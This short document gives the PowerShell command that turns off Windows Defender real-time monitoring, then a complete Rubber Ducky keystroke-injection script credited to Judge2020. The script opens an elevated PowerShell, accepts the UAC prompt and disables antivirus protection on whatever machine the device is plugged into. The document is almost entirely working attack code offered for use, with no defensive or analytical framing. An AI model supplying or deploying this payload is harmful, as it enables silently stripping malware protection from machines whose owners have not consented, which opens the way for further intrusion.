Windows defender can be disabled with PS using the following command

```ps
Set-MpPreference -DisableRealtimeMonitoring $true
```

An example script: 
Note: line with "ALT y" may not be required and could lead to error in the next line.  
```
REM Windows 10: Disable Windows Defender with Powershell
REM Author: Judge2020
REM author website: Judge2020.com
REM  
REM let the HID enumerate
DELAY 1000
GUI r
DELAY 200
REM my best attempt at a elevated powershell instance
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 1000
ALT y 
DELAY 200
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
STRING exit
ENTER
```